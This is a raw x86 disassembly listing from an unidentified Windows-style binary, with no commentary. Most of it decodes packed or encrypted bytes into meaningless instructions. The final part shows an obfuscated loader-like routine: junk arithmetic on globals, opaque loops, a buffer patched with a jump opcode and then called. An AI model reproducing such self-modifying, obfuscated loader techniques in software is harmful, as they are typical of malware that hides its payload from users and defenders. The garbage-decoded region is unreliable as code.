  41b266:	sub    BYTE PTR [esi],dl
  41b268:	jmp    0xc53a675e
  41b26d:	sbb    BYTE PTR [esi-0x7b],ah
  41b270:	fisttp DWORD PTR [edi+0xbb91d09]
  41b276:	mov    edi,0xe61dc8d
  41b27b:	lock (bad) 
  41b27e:	inc    edi
  41b27f:	mov    bl,0x7
  41b281:	je     0x41b297
  41b283:	sub    cl,bh
  41b285:	jae    0x41b249
  41b287:	push   esi
  41b288:	(bad)  
  41b28a:	or     dh,cl
  41b28c:	fcom   QWORD PTR [esi+0x78]
  41b28f:	or     al,0xe8
  41b291:	repnz add BYTE PTR [ecx-0x38],ah
  41b295:	ja     0x41b2c5
  41b297:	sti    
  41b298:	sahf   
  41b299:	ret    
  41b29a:	and    eax,0x6fdc7cf0
  41b29f:	jge    0x41b2c2
  41b2a1:	in     eax,0xd6
  41b2a3:	(bad)  
  41b2a4:	in     eax,dx
  41b2a5:	jp     0x41b29a
  41b2a7:	inc    edi
  41b2a8:	lahf   
  41b2a9:	(bad)  
  41b2ab:	jmp    0xedf4:0x31c0d015
  41b2b2:	les    ebx,FWORD PTR [ebx]
  41b2b4:	xor    al,0x8
  41b2b6:	leave  
  41b2b7:	enter  0x97ac,0x60
  41b2bb:	xor    DWORD PTR [bx+di+0x3e],0xeb623132
  41b2c3:	bound  ebp,QWORD PTR [edx+0x57bca5b8]
  41b2c9:	xchg   edx,eax
  41b2ca:	stos   DWORD PTR es:[edi],eax
  41b2cb:	fs and al,0x70
  41b2ce:	inc    ebx
  41b2cf:	daa    
  41b2d0:	and    bh,al
  41b2d2:	pop    es
  41b2d3:	sbb    BYTE PTR [edi],dl
  41b2d5:	mov    esp,0xf85506db
  41b2da:	jmp    0x7406d2fa
  41b2df:	and    BYTE PTR [ebp+eiz*4-0x32],dh
  41b2e3:	mov    al,ds:0x1ca626f2
  41b2e8:	cmp    ebx,esp
  41b2ea:	or     al,0x5
  41b2ec:	mov    DWORD PTR [esi],0x850e5ec3
  41b2f2:	mov    cl,0xc6
  41b2f4:	jmp    0x25628d89
  41b2f9:	or     al,0xe3
  41b2fb:	rcl    DWORD PTR [edi-0x53d96c12],1
  41b301:	mov    ebx,0x1d984c61
  41b306:	imul   edx,DWORD PTR [eax],0x29
  41b309:	jb     0x41b2d3
  41b30b:	outs   dx,DWORD PTR ds:[esi]
  41b30c:	sbb    al,bh
  41b30e:	xchg   edx,eax
  41b30f:	pop    esi
  41b310:	stc    
  41b311:	lea    edx,[edx-0x18ddd33b]
  41b317:	mov    ds:0xdf5b6c53,al
  41b31c:	fdivr  DWORD PTR [esi-0x31]
  41b31f:	add    ecx,DWORD PTR [ecx-0x675697df]
  41b325:	pop    es
  41b326:	or     eax,0xfb6f3586
  41b32b:	inc    edi
  41b32c:	adc    DWORD PTR [ecx+0xa6dd69f],edi
  41b332:	(bad)  
  41b333:	push   DWORD PTR [edi-0xd]
  41b336:	fiadd  DWORD PTR [edx]
  41b338:	jmp    0x6ae8:0x15b5f84f
  41b33f:	dec    ebx
  41b340:	bnd jmp 0x41b37e
  41b343:	stos   DWORD PTR es:[edi],eax
  41b344:	ds or  ch,ah
  41b347:	xor    eax,esp
  41b349:	dec    ebx
  41b34a:	(bad)  
  41b34b:	xor    ecx,DWORD PTR [edi]
  41b34d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b34e:	dec    eax
  41b34f:	mov    DWORD PTR [ebx-0x157cd39e],ebx
  41b355:	jb     0x41b326
  41b357:	adc    eax,edx
  41b359:	ret    
  41b35a:	shl    BYTE PTR [edi+0x50],1
  41b35d:	in     al,dx
  41b35e:	mov    dl,0xd7
  41b360:	aam    0x50
  41b362:	cmp    esp,DWORD PTR [ebx+edi*8-0x78]
  41b366:	pop    esp
  41b367:	scas   al,BYTE PTR es:[edi]
  41b368:	push   ebx
  41b369:	xor    al,0x93
  41b36b:	or     al,0xdf
  41b36d:	popf   
  41b36e:	loope  0x41b3a9
  41b370:	xor    ecx,DWORD PTR [ecx-0x44]
  41b373:	loopne 0x41b36f
  41b375:	dec    ebx
  41b376:	int3   
  41b377:	mov    BYTE PTR [ebx],dl
  41b379:	retf   0x625e
  41b37c:	push   edi
  41b37d:	repnz xchg bh,ch
  41b380:	aas    
  41b381:	or     esi,DWORD PTR ds:0x2aadf7da
  41b387:	push   0xffffff98
  41b389:	and    eax,esp
  41b38b:	mov    ebp,0x79e0f7c2
  41b390:	imul   ebx,DWORD PTR es:[edx+ecx*2],0xffffffe4
  41b395:	sbb    eax,DWORD PTR [ecx+0x2acd1219]
  41b39b:	ffreep st(3)
  41b39d:	fadd   QWORD PTR [ebp+0x6d0c1f23]
  41b3a3:	imul   ecx,DWORD PTR [edi-0x69],0xffffff87
  41b3a7:	call   0x1fa3:0xb0a87da4
  41b3ae:	or     eax,0xd8aecbb9
  41b3b3:	cmp    bh,BYTE PTR [ebp+0x31]
  41b3b6:	sbb    al,0x77
  41b3b8:	call   0x12da:0x41830cca
  41b3bf:	leave  
  41b3c0:	nop
  41b3c1:	xchg   edx,eax
  41b3c2:	push   ecx
  41b3c3:	ja     0x41b425
  41b3c5:	mov    ch,0xe3
  41b3c7:	enter  0x3d3b,0xcd
  41b3cb:	and    eax,DWORD PTR [eax+esi*1-0x17a8e1]
  41b3d2:	fs pop ebx
  41b3d4:	cmp    eax,0x2e77fe4a
  41b3d9:	sub    dl,BYTE PTR [edi+ebp*4-0x3a]
  41b3dd:	pop    ebp
  41b3de:	xor    BYTE PTR [edi],al
  41b3e0:	aad    0xce
  41b3e2:	jmp    0x41b379
  41b3e4:	jae    0x41b3c2
  41b3e6:	(bad)  
  41b3e7:	push   ss
  41b3e8:	pop    edx
  41b3e9:	sub    ecx,DWORD PTR ds:0xd254e524
  41b3ef:	popf   
  41b3f0:	hlt    
  41b3f1:	add    esp,DWORD PTR [ecx]
  41b3f3:	pop    esi
  41b3f4:	ins    BYTE PTR es:[edi],dx
  41b3f5:	mov    al,0x8a
  41b3f7:	and    esp,DWORD PTR ds:0x2b6e70d0
  41b3fd:	push   eax
  41b3fe:	sti    
  41b3ff:	sub    bh,al
  41b401:	packuswb mm6,QWORD PTR [edi]
  41b404:	retf   0x4a06
  41b407:	inc    esp
  41b408:	mov    ch,0xb0
  41b40a:	or     DWORD PTR [esi-0x71],0xffffffd8
  41b40e:	xchg   edx,eax
  41b40f:	pop    edi
  41b410:	(bad)  
  41b412:	push   esi
  41b413:	fcomp  DWORD PTR [ebx-0x3e]
  41b416:	ds push 0xffffffdc
  41b419:	jle    0x41b3c9
  41b41b:	enter  0xf29a,0xa9
  41b41f:	je     0x41b400
  41b421:	xor    cl,BYTE PTR [esi]
  41b423:	pop    eax
  41b424:	and    edi,DWORD PTR [ecx]
  41b426:	mov    bl,0x4c
  41b428:	aas    
  41b429:	ret    
  41b42a:	arpl   WORD PTR [edi],ax
  41b42c:	fs sbb eax,ebp
  41b42f:	inc    esp
  41b430:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b431:	lea    edx,[esp+ecx*8+0x32]
  41b435:	mov    eax,0xf03e2e51
  41b43a:	and    ch,al
  41b43c:	sbb    eax,0x7c0a7b3b
  41b441:	push   ebp
  41b442:	mov    ds:0x6f102a17,eax
  41b447:	nop
  41b448:	push   ebx
  41b449:	mov    al,ds:0xcac2f0a2
  41b44e:	xor    DWORD PTR ds:0xf960ca06,ecx
  41b454:	ss rcr bl,0xdc
  41b458:	and    ebp,ebp
  41b45a:	and    edx,DWORD PTR [ecx+ecx*8-0x1b23000d]
  41b461:	adc    BYTE PTR [esi+0x65d9da4a],0xaf
  41b468:	data16 cmc 
  41b46a:	ficomp DWORD PTR [esp-0x5f]
  41b46e:	rol    cl,0x89
  41b471:	push   ebx
  41b472:	jl     0x41b485
  41b474:	loopne 0x41b4f2
  41b476:	(bad)  
  41b477:	xor    al,0xa9
  41b479:	adc    al,0x35
  41b47b:	inc    edi
  41b47c:	push   edx
  41b47d:	push   0xd
  41b47f:	mov    dh,0x15
  41b481:	aam    0xff
  41b483:	les    ebp,FWORD PTR [edx+ebx*2]
  41b486:	xchg   ebp,ecx
  41b488:	pop    ebp
  41b489:	xor    BYTE PTR [ecx+0x3712acb],al
  41b48f:	mov    al,ds:0x603f27f7
  41b494:	sbb    eax,eax
  41b496:	mov    esp,0x1c904365
  41b49b:	enter  0xea2d,0xc8
  41b49f:	les    ebp,FWORD PTR [ecx+0x25]
  41b4a2:	out    dx,al
  41b4a3:	iret   
  41b4a4:	mov    al,ds:0xb5c1fd
  41b4a9:	daa    
  41b4aa:	mov    esp,0x45a18681
  41b4af:	in     al,0x7f
  41b4b1:	data16 loope 0x41b509
  41b4b4:	xor    BYTE PTR [edx+ecx*8+0x450cd90c],cl
  41b4bb:	loopne 0x41b44c
  41b4bd:	jmp    0x41b48a
  41b4bf:	and    DWORD PTR [esi],ebp
  41b4c1:	or     eax,0x92909817
  41b4c6:	fwait
  41b4c7:	int3   
  41b4c8:	jge    0x41b49f
  41b4ca:	aam    0xd1
  41b4cc:	dec    ecx
  41b4cd:	mov    esi,0x1dd4d98b
  41b4d2:	or     eax,ebp
  41b4d4:	test   ch,dh
  41b4d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4d7:	mov    ds:0x8a5a927a,eax
  41b4dc:	outs   dx,DWORD PTR ds:[esi]
  41b4dd:	aaa    
  41b4de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4df:	mov    ebp,0xbcc11379
  41b4e4:	or     ebx,esp
  41b4e6:	cld    
  41b4e7:	and    al,0xad
  41b4e9:	jmp    0xb992:0x66864f01
  41b4f0:	vpaddusb xmm2,xmm2,XMMWORD PTR [esi]
  41b4f5:	adc    esp,DWORD PTR [eax+esi*2]
  41b4f8:	idiv   ebx
  41b4fa:	rcl    ecx,1
  41b4fc:	sub    eax,0xa963aa
  41b501:	(bad)  
  41b503:	aam    0x14
  41b505:	data16 and ch,BYTE PTR [edx+0x4a]
  41b509:	popf   
  41b50a:	aas    
  41b50b:	dec    eax
  41b50c:	fisub  DWORD PTR [edx-0x6f7357da]
  41b512:	data16 in al,dx
  41b514:	mov    bl,BYTE PTR [edx]
  41b516:	jns    0x41b507
  41b518:	clc    
  41b519:	inc    ebp
  41b51a:	add    ch,ah
  41b51c:	cld    
  41b51d:	sbb    eax,0x8a3fa39c
  41b522:	or     BYTE PTR [ecx],bh
  41b524:	cmp    edi,DWORD PTR [edi-0x15]
  41b527:	mov    ah,0xc5
  41b529:	lods   eax,DWORD PTR ds:[esi]
  41b52a:	mov    ds,WORD PTR [edi+0x40df0648]
  41b530:	stos   DWORD PTR es:[edi],eax
  41b531:	or     dl,dh
  41b533:	ds ja  0x41b4e0
  41b536:	mov    eax,ds:0xd6dff47a
  41b53b:	mov    DWORD PTR [ebp+0x6b],ecx
  41b53e:	lods   al,BYTE PTR ds:[esi]
  41b53f:	in     eax,0xb7
  41b541:	pusha  
  41b542:	sub    al,0xf1
  41b544:	daa    
  41b545:	cwde   
  41b546:	pop    es
  41b547:	and    al,0x52
  41b549:	xchg   DWORD PTR ds:0x358f5013,ebx
  41b54f:	mov    al,ds:0x442a6289
  41b554:	mov    fs,WORD PTR [ecx-0x42]
  41b557:	inc    edx
  41b558:	push   ebp
  41b559:	lods   al,BYTE PTR ds:[esi]
  41b55a:	bound  esp,QWORD PTR [ecx-0x256d6e]
  41b560:	js     0x41b4f6
  41b562:	ja     0x41b53f
  41b564:	xor    eax,0xeb3d5671
  41b569:	xchg   ebx,eax
  41b56a:	mov    ecx,0x825ac90b
  41b56f:	mov    BYTE PTR [edx-0x1ba2a918],0xca
  41b576:	adc    ebp,DWORD PTR [edi-0x66]
  41b579:	pusha  
  41b57a:	jae    0x41b5ce
  41b57c:	mov    ch,0xe5
  41b57e:	push   0xb071b04c
  41b583:	adc    BYTE PTR [edx],dh
  41b585:	pusha  
  41b586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b587:	cld    
  41b588:	adc    eax,0xe58c5b42
  41b58d:	call   DWORD PTR [edi+0x74]
  41b590:	ins    BYTE PTR es:[edi],dx
  41b591:	test   DWORD PTR [edx-0xa],eax
  41b594:	sbb    edi,DWORD PTR ss:[eax+0x49]
  41b598:	mov    ds:0xd30a3c4,eax
  41b59d:	jmp    FWORD PTR ds:0x63683633
  41b5a3:	sbb    edi,ecx
  41b5a5:	or     dh,BYTE PTR [edx-0x37]
  41b5a8:	jno    0x41b5fe
  41b5aa:	mov    dl,0xd0
  41b5ac:	in     eax,dx
  41b5ad:	test   DWORD PTR [esi+0x14bdc5ea],0xb5f9a474
  41b5b7:	push   edi
  41b5b8:	dec    edx
  41b5b9:	fistp  DWORD PTR [ecx]
  41b5bb:	add    cl,BYTE PTR [eax-0x1ec80213]
  41b5c1:	or     esp,DWORD PTR [ecx+0x23c9fd7b]
  41b5c7:	jmp    0xb328:0x767ba1dd
  41b5ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5cf:	ds loop 0x41b5bd
  41b5d2:	test   DWORD PTR [ecx+edx*4-0x794f6aba],eax
  41b5d9:	mov    ebp,DWORD PTR [ecx+0x52c1edcb]
  41b5df:	inc    ebx
  41b5e0:	(bad)  
  41b5e1:	mov    ds:0x1c1bba42,al
  41b5e6:	push   ebx
  41b5e7:	test   ah,ch
  41b5e9:	sub    al,0x30
  41b5eb:	icebp  
  41b5ec:	pop    eax
  41b5ed:	fsub   st(4),st
  41b5ef:	mov    esi,0xea00c201
  41b5f4:	cmp    al,0xfe
  41b5f6:	inc    ecx
  41b5f7:	sbb    dl,dh
  41b5f9:	daa    
  41b5fa:	and    eax,0xd7f65c54
  41b5ff:	in     eax,0x3d
  41b601:	sub    eax,0xb40a9d6c
  41b606:	pop    ebp
  41b607:	outs   dx,DWORD PTR ds:[esi]
  41b608:	repz repnz push edi
  41b60b:	xlat   BYTE PTR ds:[ebx]
  41b60c:	jb     0x41b5c9
  41b60e:	jmp    0x41b5e9
  41b610:	popf   
  41b611:	or     edi,DWORD PTR [ecx+0x5a]
  41b614:	loope  0x41b5bd
  41b616:	add    ebx,DWORD PTR [edi]
  41b618:	xchg   edi,eax
  41b619:	or     cl,bh
  41b61b:	mov    ch,0xa
  41b61d:	and    esi,DWORD PTR [ebp+0x17582299]
  41b623:	outs   dx,DWORD PTR ds:[esi]
  41b624:	out    dx,eax
  41b625:	retf   0xbc50
  41b628:	cs es gs pushf 
  41b62c:	or     bh,BYTE PTR [ebx+ebp*4+0x58883cfd]
  41b633:	push   cs
  41b634:	push   ss
  41b635:	stc    
  41b636:	push   ebp
  41b637:	inc    edx
  41b638:	(bad)
  41b63b:	push   edx
  41b63c:	xor    ebx,DWORD PTR [ebx-0x60]
  41b63f:	cli    
  41b640:	mov    esp,0x69f52e54
  41b645:	mov    al,0x2d
  41b647:	stc    
  41b648:	fmul   QWORD PTR [ebp+ebx*1+0x4f]
  41b64c:	jmp    0x41b665
  41b64e:	jae    0x41b665
  41b650:	ret    
  41b651:	xor    BYTE PTR [esi],ah
  41b653:	dec    eax
  41b654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b655:	cmp    bh,dh
  41b657:	sbb    DWORD PTR [ecx-0x356aa9be],ebp
  41b65d:	mov    bh,0x0
  41b65f:	fwait
  41b660:	xchg   BYTE PTR [ecx],dl
  41b662:	cmp    bl,BYTE PTR [edi-0x3a]
  41b665:	dec    ebx
  41b666:	ins    DWORD PTR es:[edi],dx
  41b667:	js     0x41b5ea
  41b669:	lock test al,0x70
  41b66c:	mul    BYTE PTR [ebx-0x39]
  41b66f:	xchg   esi,eax
  41b670:	xchg   ebp,eax
  41b671:	adc    ch,cl
  41b673:	fsub   QWORD PTR [edx-0x76]
  41b676:	out    0x6c,al
  41b678:	in     al,dx
  41b679:	sbb    esp,DWORD PTR [ebp+0x77]
  41b67c:	fs in  al,0x7a
  41b67f:	cmp    eax,0x49f37120
  41b684:	mov    ebp,0xa1325cc
  41b689:	repz and cl,BYTE PTR ds:0x6a59ea16
  41b690:	int3   
  41b691:	aad    0xaa
  41b693:	lods   al,BYTE PTR ds:[esi]
  41b694:	or     bl,BYTE PTR [edx-0x44]
  41b697:	dec    eax
  41b698:	ins    DWORD PTR es:[edi],dx
  41b699:	pop    ds
  41b69a:	fcomp  QWORD PTR [ecx-0x4a]
  41b69d:	inc    ebx
  41b69e:	xor    ah,cl
  41b6a0:	jb     0x41b703
  41b6a2:	xchg   esi,eax
  41b6a3:	cmp    eax,0xeab935f6
  41b6a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6a9:	dec    edi
  41b6aa:	jg     0x41b689
  41b6ac:	xchg   ebx,eax
  41b6ad:	ins    DWORD PTR es:[edi],dx
  41b6ae:	jmp    0x7859:0x210ef670
  41b6b5:	and    eax,0xd8c43816
  41b6ba:	arpl   WORD PTR [edi-0x33],ax
  41b6bd:	in     eax,dx
  41b6be:	test   al,0xda
  41b6c0:	(bad)  
  41b6c1:	aad    0x84
  41b6c3:	dec    eax
  41b6c4:	pop    esi
  41b6c5:	add    BYTE PTR [ebp+0x487831a1],ch
  41b6cb:	jecxz  0x41b70e
  41b6cd:	stos   BYTE PTR es:[edi],al
  41b6ce:	jmp    0x41b6e8
  41b6d0:	mov    eax,ds:0x3e5af9a
  41b6d5:	cdq    
  41b6d6:	ror    BYTE PTR ds:0x86db18c2,cl
  41b6dc:	xchg   edx,eax
  41b6dd:	cmc    
  41b6de:	or     edx,esi
  41b6e0:	sti    
  41b6e1:	mov    dh,BYTE PTR [ebx+edi*4+0x6]
  41b6e5:	in     eax,0x27
  41b6e7:	popf   
  41b6e8:	jo     0x41b695
  41b6ea:	cmp    DWORD PTR [edx-0x49],esi
  41b6ed:	inc    esp
  41b6ee:	(bad)  
  41b6ef:	(bad)
  41b6f3:	jle    0x41b6f2
  41b6f5:	jbe    0x41b6a2
  41b6f7:	test   al,bl
  41b6f9:	xor    BYTE PTR [eax+0x74249f17],bh
  41b6ff:	cld    
  41b700:	xchg   edx,eax
  41b701:	add    eax,0xe0133b85
  41b706:	push   ebx
  41b707:	int    0x26
  41b709:	repnz in al,dx
  41b70b:	shl    BYTE PTR [edi],1
  41b70d:	add    eax,0x8110f5d7
  41b712:	jp     0x41b6fd
  41b714:	or     BYTE PTR ds:[esi+0x5],bl
  41b718:	aam    0x4e
  41b71a:	pop    esp
  41b71b:	and    al,0x9c
  41b71d:	ins    DWORD PTR es:[edi],dx
  41b71e:	mov    cl,cl
  41b720:	out    dx,eax
  41b721:	scas   al,BYTE PTR es:[edi]
  41b722:	inc    ebp
  41b723:	xor    BYTE PTR [esp+ebp*1+0x480a599f],cl
  41b72a:	aas    
  41b72b:	call   0x6e97be8d
  41b730:	xchg   edi,eax
  41b731:	sbb    esi,DWORD PTR [esi+0x3c]
  41b734:	cs addr16 xchg ebx,eax
  41b737:	sahf   
  41b738:	(bad)  
  41b739:	pop    esi
  41b73a:	xor    DWORD PTR [edi+0xb],eax
  41b73d:	mov    bh,BYTE PTR [edx-0x538a2fb8]
  41b743:	adc    al,0x7
  41b745:	sub    dl,BYTE PTR [edx]
  41b747:	cmp    dl,BYTE PTR [edx+0x58]
  41b74a:	ror    BYTE PTR [ebp+0x0],cl
  41b74d:	xor    al,0x74
  41b74f:	fs mov eax,0x6f5bd4ce
  41b755:	out    dx,al
  41b756:	jmp    0x5fc098e7
  41b75b:	push   es
  41b75c:	aam    0x88
  41b75e:	dec    ecx
  41b75f:	inc    edi
  41b760:	ss or  eax,eax
  41b763:	and    DWORD PTR [esi],ebx
  41b765:	repz adc dl,BYTE PTR [esi-0x1b]
  41b769:	sahf   
  41b76a:	xor    BYTE PTR [edi-0x26ef2d6],dh
  41b770:	adc    eax,0xeeea7019
  41b775:	call   0xe943df5
  41b77a:	sbb    BYTE PTR [edx+0xa76938],dl
  41b780:	add    DWORD PTR [esp+ebx*2-0x61],esi
  41b784:	fisubr DWORD PTR [eax+0xc616385]
  41b78a:	sub    esp,eax
  41b78c:	push   ebx
  41b78d:	sti    
  41b78e:	lock sbb eax,DWORD PTR ds:[esi-0x44c067a0]
  41b796:	lock cld 
  41b798:	lock retf 0x3524
  41b79c:	aaa    
  41b79d:	mov    esp,0x978cbdfd
  41b7a2:	sub    eax,0xcf8d2c41
  41b7a7:	adc    BYTE PTR [esi],dh
  41b7a9:	fbld   TBYTE PTR [eax+0x4b38ee65]
  41b7af:	and    al,0xf2
  41b7b1:	push   ebp
  41b7b2:	arpl   WORD PTR [edi],dx
  41b7b4:	test   DWORD PTR [ecx-0x2f],0xec3020f9
  41b7bb:	adc    DWORD PTR [edi+0x67],ecx
  41b7be:	(bad)  
  41b7bf:	adc    al,0xac
  41b7c1:	andnps xmm5,XMMWORD PTR [esp+edi*1]
  41b7c5:	add    bh,BYTE PTR [ebx+0x660777b5]
  41b7cb:	iret   
  41b7cc:	cmp    ebx,DWORD PTR [edx+0x4b]
  41b7cf:	mov    bp,0xf14e
  41b7d3:	pmullw mm5,QWORD PTR [esi-0x50ad9ae5]
  41b7da:	xor    eax,0x679a6d57
  41b7df:	pop    es
  41b7e0:	push   esi
  41b7e1:	out    0xb1,eax
  41b7e3:	xchg   DWORD PTR [ecx+0x681a2561],edi
  41b7e9:	pop    ss
  41b7ea:	rcr    BYTE PTR [esp+edi*2],cl
  41b7ed:	outs   dx,BYTE PTR ds:[esi]
  41b7ee:	sub    BYTE PTR [ecx],ah
  41b7f0:	mov    ecx,0xa55d4210
  41b7f5:	repnz or eax,esi
  41b7f8:	and    ebp,DWORD PTR [edx]
  41b7fa:	and    DWORD PTR [edi+0x66],eax
  41b7fd:	retf   0x14cb
  41b800:	xor    cl,ch
  41b802:	jae    0x41b829
  41b804:	call   0x9eb70961
  41b809:	push   ss
  41b80a:	jo     0x41b7b7
  41b80c:	scas   eax,DWORD PTR es:[edi]
  41b80d:	xchg   esi,eax
  41b80e:	ficom  WORD PTR [edx+edx*1-0x60]
  41b812:	add    eax,0x7943894e
  41b817:	shr    DWORD PTR [edx],cl
  41b819:	xor    al,0x67
  41b81b:	mov    ebp,0x6f28f77a
  41b820:	cmp    ch,BYTE PTR [eax]
  41b822:	icebp  
  41b823:	jge    0x41b7bb
  41b825:	push   eax
  41b826:	sub    bh,cl
  41b828:	xchg   ebp,eax
  41b829:	jb     0x41b7ed
  41b82b:	rol    DWORD PTR [ebp+edi*2-0x2a],0x43
  41b830:	outs   dx,BYTE PTR ds:[esi]
  41b831:	or     DWORD PTR [esp+eax*1+0x0],edi
  41b835:	mov    BYTE PTR [esi+0x5d],0xbe
  41b839:	ret    
  41b83a:	xor    al,BYTE PTR [edx]
  41b83c:	test   eax,0xd1e7c21d
  41b841:	rcr    BYTE PTR ds:0xe1cf569f,1
  41b847:	jno    0x41b7de
  41b849:	arpl   cx,si
  41b84b:	int3   
  41b84c:	aad    0x8b
  41b84e:	dec    ebp
  41b84f:	cld    
  41b850:	and    DWORD PTR ds:0x428ec3,0x32ec
  41b85a:	sub    eax,ecx
  41b85c:	mov    DWORD PTR [ebp-0x4],eax
  41b85f:	add    DWORD PTR ds:0x428e6b,0x1dd5
  41b869:	or     DWORD PTR [ebp-0x4],0xf89c85a0
  41b870:	xor    DWORD PTR ds:0x428e7f,ebx
  41b876:	mov    eax,DWORD PTR [ebp-0xc]
  41b879:	dec    DWORD PTR ds:0x428e67
  41b87f:	xor    eax,esi
  41b881:	or     DWORD PTR ds:0x428e33,0x9ab
  41b88b:	add    eax,edi
  41b88d:	push   eax
  41b88e:	mov    eax,DWORD PTR [ebp-0x10]
  41b891:	xor    eax,esi
  41b893:	add    DWORD PTR ds:0x428eab,0x428e6b
  41b89d:	add    eax,edi
  41b89f:	and    DWORD PTR ds:0x428e67,0x428e87
  41b8a9:	push   eax
  41b8aa:	mov    eax,DWORD PTR [ebp-0x4]
  41b8ad:	or     DWORD PTR ds:0x428e2b,0x148
  41b8b7:	xor    eax,esi
  41b8b9:	xor    DWORD PTR ds:0x428e83,0x7f59
  41b8c3:	add    eax,0x3272fa
  41b8c8:	push   eax
  41b8c9:	lea    eax,[ebp-0x78]
  41b8cc:	push   eax
  41b8cd:	push   DWORD PTR [ebp-0x2c]
  41b8d0:	push   DWORD PTR [ebp-0x28]
  41b8d3:	call   0x411af5
  41b8d8:	test   eax,eax
  41b8da:	je     0x41b908
  41b8e0:	lea    eax,[ebp-0x78]
  41b8e3:	push   eax
  41b8e4:	mov    eax,DWORD PTR [ebp-0x28]
  41b8e7:	xor    eax,esi
  41b8e9:	add    eax,edi
  41b8eb:	push   eax
  41b8ec:	mov    eax,DWORD PTR [ebp-0x24]
  41b8ef:	add    eax,0xaa
  41b8f4:	push   eax
  41b8f5:	mov    eax,DWORD PTR [ebp-0x24]
  41b8f8:	mov    eax,DWORD PTR [eax+0x198]
  41b8fe:	push   DWORD PTR [eax]
  41b900:	call   0x4061d0
  41b905:	mov    DWORD PTR [ebp-0x14],eax
  41b908:	mov    ecx,DWORD PTR ds:0x42846b
  41b90e:	lea    eax,[ebp+0x4]
  41b911:	mov    DWORD PTR [ecx*4+0x428463],eax
  41b918:	inc    DWORD PTR ds:0x42846b
  41b91e:	mov    eax,DWORD PTR [ebp-0x14]
  41b921:	test   eax,eax
  41b923:	je     0x41b995
  41b929:	lea    eax,[ebp-0x8]
  41b92c:	mov    DWORD PTR [ebp-0x34],eax
  41b92f:	mov    eax,DWORD PTR [ebp-0x30]
  41b932:	mov    DWORD PTR [ebp-0x8],eax
  41b935:	mov    eax,DWORD PTR [ebp-0x8]
  41b938:	mov    ecx,DWORD PTR [ebp-0x14]
  41b93b:	sub    eax,ecx
  41b93d:	mov    DWORD PTR [ebp-0x8],eax
  41b940:	mov    ecx,DWORD PTR [ebp-0x4]
  41b943:	xor    ecx,esi
  41b945:	mov    eax,0xffcd8d0a
  41b94a:	sub    eax,ecx
  41b94c:	add    DWORD PTR [ebp-0x8],eax
  41b94f:	mov    eax,DWORD PTR [ebp-0x14]
  41b952:	mov    DWORD PTR [eax],0x675565e9
  41b958:	mov    DWORD PTR [eax+0x4],0x76576787
  41b95f:	mov    eax,DWORD PTR [ebp-0x8]
  41b962:	mov    ecx,DWORD PTR [ebp-0x14]
  41b965:	push   DWORD PTR [ebp-0x24]
  41b968:	mov    DWORD PTR [ecx+0x1],eax
  41b96b:	mov    eax,ds:0x4281ef
  41b970:	push   DWORD PTR [eax]
  41b972:	push   DWORD PTR ds:0x428453
  41b978:	push   DWORD PTR ds:0x4281f7
  41b97e:	push   DWORD PTR ds:0x428433
  41b984:	push   DWORD PTR ds:0x428c1f
  41b98a:	push   DWORD PTR [ebp-0x28]
  41b98d:	push   DWORD PTR [ebp-0x2c]
  41b990:	mov    eax,DWORD PTR [ebp-0x14]
  41b993:	call   eax
  41b995:	pop    edi
  41b996:	pop    esi
  41b997:	leave  
  41b998:	ret    
  41b999:	push   ebp
  41b99a:	mov    ebp,esp
  41b99c:	sub    esp,0x34
  41b99f:	push   ebx
  41b9a0:	dec    edx
  41b9a1:	push   esi
  41b9a2:	push   edi
  41b9a3:	xor    ecx,ecx
  41b9a5:	xor    ecx,DWORD PTR ds:0x4292ff
  41b9ab:	mov    esi,DWORD PTR ds:0x429bf7
  41b9b1:	sub    esi,ecx
  41b9b3:	sub    ecx,DWORD PTR [ecx+esi*1]
  41b9b6:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  41b9bd:	lea    eax,[ebp+0x14]
  41b9c0:	and    DWORD PTR ds:0x428eb3,0x0
  41b9ca:	mov    esi,DWORD PTR ds:0x428eb3
  41b9d0:	inc    esi
  41b9d1:	mov    DWORD PTR ds:0x428eb3,esi
  41b9d7:	cmp    DWORD PTR ds:0x428eb3,0x6
  41b9de:	jg     0x41ba1e
  41b9e4:	jmp    0x41b9f7
  41b9e9:	push   0x428e6b
  41b9ee:	push   DWORD PTR [ebp-0x20]
  41b9f1:	call   DWORD PTR ds:0x42a9df
  41b9f7:	cmp    DWORD PTR ds:0x428eb3,0x5
  41b9fe:	jne    0x41ba11
  41ba04:	mov    esi,DWORD PTR ds:0x428eb3
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x428eb3,esi
  41ba11:	cmp    DWORD PTR ds:0x428eb3,0x1f
  41ba18:	jb     0x41b9ca
  41ba1e:	mov    DWORD PTR [ebp-0x4],eax
  41ba21:	sbb    edx,DWORD PTR ds:0x428ec7
  41ba27:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  41ba2e:	mov    DWORD PTR ds:0x428e2f,0x1d
  41ba38:	cmp    DWORD PTR ds:0x428e2f,0x0
  41ba3f:	je     0x41ba75
  41ba45:	cmp    DWORD PTR ds:0x428e2f,0x26
  41ba4c:	jle    0x41ba75
  41ba52:	jmp    0x41ba63
  41ba57:	push   DWORD PTR [ebp-0x24]
  41ba5a:	push   DWORD PTR [ebp-0x28]
  41ba5d:	call   DWORD PTR ds:0x42a9e3
  41ba63:	mov    ecx,DWORD PTR ds:0x428e2f
  41ba69:	dec    ecx
  41ba6a:	mov    DWORD PTR ds:0x428e2f,ecx
  41ba70:	jmp    0x41ba38
  41ba75:	lea    eax,[ebp-0xc]
  41ba78:	and    DWORD PTR ds:0x428e5b,0x0
  41ba82:	jmp    0x41ba94
  41ba87:	mov    ecx,DWORD PTR ds:0x428e5b
  41ba8d:	inc    ecx
  41ba8e:	mov    DWORD PTR ds:0x428e5b,ecx
  41ba94:	cmp    DWORD PTR ds:0x428e5b,0x1d
  41ba9b:	jae    0x41bac3
  41baa1:	cmp    DWORD PTR ds:0x428e5b,0x2b
  41baa8:	jge    0x41bac3
  41baae:	jmp    0x41babe
